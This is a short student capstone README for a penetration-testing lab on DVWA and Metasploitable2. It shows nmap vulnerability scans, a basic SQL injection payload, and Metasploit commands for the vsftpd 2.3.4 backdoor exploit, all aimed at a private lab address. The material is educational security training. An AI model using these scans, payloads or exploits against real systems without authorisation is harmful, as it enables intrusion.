# Task-5: Capstone Project & Incident Response

## Overview
This project demonstrates practical penetration testing and incident response concepts using Kali Linux, DVWA, Nmap, and Metasploit in a controlled virtual lab environment.

The objective of this project was to understand vulnerability assessment, exploitation techniques, web application security testing, and basic incident response workflows.

---

# Tools Used
- Kali Linux
- DVWA (Damn Vulnerable Web Application)
- Metasploitable2
- Nmap
- Metasploit Framework
- VirtualBox

---

# Project Activities

## 1. Vulnerability Scanning
Performed reconnaissance and vulnerability assessment using Nmap.

### Commands Used

```bash
nmap -sV 192.168.56.101
```

```bash
nmap --script vuln 192.168.56.101
```

### Outcome
- Identified open ports and services
- Detected vulnerable services
- Understood basic scanning methodology

---

# 2. Web Application Security Testing

Performed SQL Injection testing using DVWA.

### SQL Injection Payload

```sql
1 OR 1=1
```

### Outcome
- Demonstrated SQL Injection vulnerability
- Understood insecure input handling risks

---

# 3. Exploitation using Metasploit

Used Metasploit Framework to test vulnerable services.

### Commands Used

```bash
msfconsole
```

```bash
search vsftpd
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

```bash
set RHOSTS 192.168.56.101
```

```bash
run
```

### Outcome
- Exploitation process demonstrated
- Learned basic penetration testing workflow

---

# 4. Incident Response Concepts

Studied basic incident response and mitigation techniques including:
- Vulnerability identification
- Risk analysis
- Security monitoring
- System hardening concepts

---

# Learning Outcomes
- Network scanning and reconnaissance
- Web application security testing
- Exploitation basics using Metasploit
- Understanding of cybersecurity workflows
- Practical ethical hacking exposure

---

# Disclaimer
This project was performed in a safe and controlled lab environment for educational purposes only.
